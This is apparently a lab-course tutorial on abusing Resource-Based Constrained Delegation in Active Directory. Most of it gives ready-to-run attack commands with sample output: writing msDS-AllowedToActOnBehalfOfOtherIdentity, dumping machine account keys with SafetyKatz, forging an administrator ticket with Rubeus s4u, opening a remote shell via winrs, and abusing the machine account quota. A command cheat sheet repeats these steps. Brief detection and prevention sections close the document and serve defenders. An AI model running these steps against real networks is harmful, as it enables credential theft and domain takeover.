# Resource-Based Constrained Delegation

**Date:** 15 August 2026

---

## What is Resource-Based Constrained Delegation?

**RBCD = Delegation authority moved to resource/service administrator.**

**Key difference from standard constrained delegation:**

| Aspect | Standard Delegation | RBCD |
|---|---|---|
| Authority | Front-end service (websvc) | Resource/Service (SQL server) |
| Configuration | msDS-AllowedToDelegateTo on websvc | msDS-AllowedToActOnBehalfOfOtherIdentity on SQL |
| Required privilege | SeEnableDelegation (DA only) | Write permission on resource (any admin) |
| Administrator | Domain Admin | Resource admin |
| Flexibility | Limited by DA approval | Flexible (resource owner decides) |

---

## Why RBCD is Powerful

✅ **Resource admin control** — no DA approval needed  
✅ **Lower privilege requirement** — just Write permissions  
✅ **No SeEnableDelegation** — available to resource admins  
✅ **Effective exploitation** — only needs 2 conditions  
✅ **Domain-joined machines** — all users get 10 machine quota  

---

## RBCD Exploitation Prerequisites

**Two privileges needed:**

1. **Write permissions over target service/resource**
   - Set msDS-AllowedToActOnBehalfOfOtherIdentity
   - Resource administrator typically has this
   - Example: ciadmin has Write on dcorp-mgmt

2. **Control over object with SPN configured**
   - SPN = Service Principal Name
   - Machine account (domain-joined computer)
   - Service account with SPN
   - Example: dcorp-student1$ machine account

---

## Step 1: Enumerate Objects with Write Permissions

**Find who has Write permissions on target resource:**

```powershell
Find-InterestingDomainACL | ?{$_.IdentityReferenceName -match "ciadmin"}
```

**Output:**
```
ObjectName: dcorp-mgmt
ObjectType: Computer
AceType: All
IdentityReferenceName: ciadmin
Permissions: GenericWrite, WriteProperty
```

ciadmin has Write permissions on dcorp-mgmt.

---

## Step 2: Identify Machine Accounts with SPN

**Domain users can create machines (default quota = 10):**

```powershell
Get-ADComputer -Filter {Name -like "dcorp-student*"} | select Name, SamAccountName
```

**Output:**
```
Name: dcorp-student1
SamAccountName: dcorp-student1$

Name: dcorp-student2
SamAccountName: dcorp-student2$
```

All domain-joined machines have machine account SPNs.

---

## Step 3: Configure RBCD on Target Resource

**Set up RBCD on dcorp-mgmt to allow delegation from student machines:**

```powershell
$comps = 'dcorp-student1$','dcorp-student2$'
Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
```

**What this does:**
- Adds dcorp-student1$ and dcorp-student2$ to msDS-AllowedToActOnBehalfOfOtherIdentity
- Allows these machines to impersonate any user to dcorp-mgmt
- Now student machines can delegate to dcorp-mgmt

---

**Alternative: Using PowerView**

```powershell
Set-DomainObject -Identity dcorp-mgmt -Set @{"msDS-AllowedToActOnBehalfOfOtherIdentity"=$comps}
```

---

## Step 4: Verify RBCD Configuration

**Check msDS-AllowedToActOnBehalfOfOtherIdentity:**

```powershell
Get-ADComputer -Identity dcorp-mgmt -Properties PrincipalsAllowedToDelegateToAccount | 
  select PrincipalsAllowedToDelegateToAccount
```

Should show:
```
CN=DCORP-STUDENT1$,CN=Computers,DC=dollarcorp,DC=moneycorp,DC=local
CN=DCORP-STUDENT2$,CN=Computers,DC=dollarcorp,DC=moneycorp,DC=local
```

---

## Step 5: Extract Machine Account Keys

**Get AES256 key of dcorp-student1$ (from student machine):**

```powershell
SafetyKatz.exe '"sekurlsa::ekeys"'
```

**Output:**
```
[00000000] NTLM:     a102ad5753f4c441e3af31c97fad86fd
[00000001] AES256:   d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2
[00000002] AES128:   5f4dcc3b5aa765d61d8327deb882cf99
```

Extract AES256: `d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2`

---

## Step 6: Use Rubeus S4U for Impersonation

**Request TGS as dcorp-student1$ to access dcorp-mgmt as Administrator:**

```powershell
Rubeus.exe s4u 
  /user:dcorp-student1$ 
  /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 
  /msdsspn:http/dcorp-mgmt 
  /impersonateuser:administrator 
  /ptt
```

**Parameters:**
- `/user:dcorp-student1$` — Machine account with RBCD privilege
- `/aes256` — AES256 key of student machine
- `/msdsspn:http/dcorp-mgmt` — Service to delegate to
- `/impersonateuser:administrator` — Impersonate administrator
- `/ptt` — Pass-the-ticket (load immediately)

---

## Step 7: Access Target Service

**Remote shell on dcorp-mgmt as administrator:**

```powershell
winrs -r:dcorp-mgmt cmd.exe
```

Remote command shell opened as Administrator on dcorp-mgmt.

---

**Verify:**

```powershell
whoami
# Output: DOLLARCORP\Administrator

hostname
# Output: DCORP-MGMT
```

---

## Complete RBCD Attack Workflow

```
1. Find resource with Write permissions (ciadmin on dcorp-mgmt)
   ↓
2. Identify machine accounts with SPNs (dcorp-student1$, dcorp-student2$)
   ↓
3. Configure RBCD on dcorp-mgmt (add student machines)
   ↓
4. Extract machine account keys (sekurlsa::ekeys)
   ↓
5. Use Rubeus S4U (impersonate administrator)
   ↓
6. Request TGS via S4U2Self (student$ → student$)
   ↓
7. Forward TGS via S4U2Proxy (student$ → dcorp-mgmt as admin)
   ↓
8. Load ticket into memory (/ptt)
   ↓
9. Remote access to dcorp-mgmt as administrator
```

---

## Why RBCD is Game-Changing

✅ **No DA required** — just Write permission on resource  
✅ **Resource admin friendly** — not controlled by DA  
✅ **Machine quota abuse** — 10 machines per user (default)  
✅ **Any user can create machines** — if quota not disabled  
✅ **Effective privilege escalation** — from resource admin to service access  

---

## Machine Account Quota Abuse

**Default: Every domain user can create 10 computer accounts:**

```powershell
# Check machine quota
Get-DomainObject -Identity "DC=dollarcorp,DC=moneycorp,DC=local" | 
  select ms-DS-MachineAccountQuota
```

If quota > 0 (default is 10):

```powershell
# Create machine account
New-ADComputer -Name student-machine -Enabled $true -Description "Test"

# Use this machine for RBCD exploitation
```

---

## RBCD Flow Explanation

```
┌─────────────────────────────────────────────────────────┐
│ RESOURCE-BASED CONSTRAINED DELEGATION                  │
└─────────────────────────────────────────────────────────┘

1. Attacker: Write permission on dcorp-mgmt
   ↓
2. Configure: msDS-AllowedToActOnBehalfOfOtherIdentity
   Add: dcorp-student1$ (or created machine)
   ↓
3. Extract: Machine account key (dcorp-student1$)
   ↓
4. S4U2Self: dcorp-student1$ → TGS for dcorp-student1$
   (as administrator)
   ↓
5. S4U2Proxy: dcorp-student1$ → TGS for dcorp-mgmt
   (using delegated credential for administrator)
   ↓
6. Load: TGS into memory (/ptt)
   ↓
7. Access: dcorp-mgmt as administrator
```

---

## Abuse Scenarios

**Scenario 1: Resource Admin Escalation**
```
Attacker: Resource admin on fileserver
Attack: Create machine or use existing with RBCD
Result: Impersonate DA to DC, DCSync
Impact: Domain compromise
```

**Scenario 2: Domain User Escalation**
```
Attacker: Domain user (quota=10 machines)
Attack: Create machine, configure RBCD on target
Result: Access service as DA
Impact: Privilege escalation to DA
```

---

## Command Reference

| Task | Command |
|---|---|
| Find Write ACLs | `Find-InterestingDomainACL \| ?{$_.IdentityReferenceName -match "user"}` |
| List machines | `Get-ADComputer -Filter {Name -like "pattern"} \| select Name, SamAccountName` |
| Configure RBCD | `Set-ADComputer -Identity target -PrincipalsAllowedToDelegateToAccount $comps` |
| Verify RBCD | `Get-ADComputer -Identity target -Properties PrincipalsAllowedToDelegateToAccount` |
| Extract keys | `SafetyKatz.exe '"sekurlsa::ekeys"'` |
| S4U exploitation | `Rubeus.exe s4u /user:machine$ /aes256:<key> /msdsspn:service/target /impersonateuser:admin /ptt` |
| Remote access | `winrs -r:target cmd.exe` |
| Check quota | `Get-DomainObject -Identity "DC=..." \| select ms-DS-MachineAccountQuota` |
| Create machine | `New-ADComputer -Name machine-name -Enabled $true` |

---

## Detection

**What logs:**
- Computer account creation (4741, 4743)
- Attribute modification on resources (5136)
- S4U events (4769)
- Account modification logs

**What doesn't log:**
- RBCD configuration (if not monitored)
- S4U exploitation (subtle LDAP activity)
- Key extraction (local operation)

---

## Prevention

- **Audit msDS-AllowedToActOnBehalfOfOtherIdentity** — regular checks
- **Disable machine quota** — limit machine account creation
- **Monitor account creation** — especially by non-admins
- **Restrict Write permissions** — limit who can modify resources
- **Monitor S4U events** — track impersonation
- **Protect machine accounts** — secure extraction of keys
- **Implement PKI** — reduce reliance on Kerberos

---

## Key Differences: Constrained Delegation Types

| Type | Configuration | Authority | Requirements |
|---|---|---|---|
| Standard | msDS-AllowedToDelegateTo on service | DA (SeEnableDelegation) | High privilege |
| RBCD | msDS-AllowedToActOnBehalfOfOtherIdentity on resource | Resource admin | Write permission |
| Unconstrained | UserAccountControl flag | DA | Any service |

---

## RBCD vs Unconstrained Delegation

| Aspect | RBCD | Unconstrained |
|---|---|---|
| Scope | Specific resource | Any service |
| Configuration | Resource ACL | Service ACL |
| Privilege | Write permission | DA required |
| Control | Resource admin | DA |
| Effectiveness | High (targeted) | Very high (broad) |

---

## Key Takeaway

```
RBCD = Resource-admin-friendly delegation
1. Find Write permission on target (resource admin)
2. Control machine account with SPN
3. Configure RBCD (add machine to ACL)
4. Extract machine key
5. Use S4U to impersonate any user
6. Access service as DA
7. Perfect for privilege escalation
8. No DA approval needed
```

---

## References

- [Rubeus - S4U & RBCD](https://github.com/GhostPack/Rubeus)
- [RBCD (Harmj0y)](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [msDS-AllowedToActOnBehalfOfOtherIdentity (Microsoft)](https://docs.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity)
- [SafetyKatz - Key Extraction](https://github.com/GhostPack/SafetyKatz)

---

*Next: Advanced Attacks & Cleanup*
